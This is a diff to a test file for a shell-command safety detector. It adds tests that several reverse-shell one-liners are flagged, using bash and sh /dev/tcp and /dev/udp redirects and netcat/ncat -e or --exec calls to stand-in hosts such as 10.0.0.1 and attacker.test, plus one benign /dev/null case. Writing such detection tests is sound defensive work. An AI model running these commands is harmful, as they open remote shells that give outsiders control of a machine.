@@ -90,6 +90,22 @@ test("& script.ps1 is detected", () => detects("& /tmp/malicious.ps1"));
 test("source script.sh still detected (POSIX regression)", () =>
   detects("source /tmp/x.sh"));
 
+// ── Reverse shells ──────────────────────────────────────────────────
+
+test("bash /dev/tcp reverse shell is detected", () =>
+  detects("bash -i >& /dev/tcp/10.0.0.1/4443 0>&1", { note: "0DIN Axiom shape" }));
+test("sh /dev/tcp reverse shell is detected", () =>
+  detects("sh -i >& /dev/tcp/attacker.test/9001 0>&1"));
+test("/dev/udp reverse shell is detected", () =>
+  detects("bash -c 'exec 3<>/dev/udp/1.2.3.4/53'"));
+test("netcat -e reverse shell is detected", () =>
+  detects("nc -e /bin/sh 10.0.0.1 4443"));
+test("ncat -e reverse shell is detected", () =>
+  detects("ncat --exec /bin/bash 10.0.0.1 4443", { note: "long-form --exec" }));
+
+test("routine /dev/null redirect does not trigger reverse-shell", () =>
+  doesNotDetect("echo done > /dev/null", { note: "/dev/null is benign" }));
+
 // ── Legit commands must not trigger (false-positive floor) ──────────
 
 test("python --version does not trigger", () =>
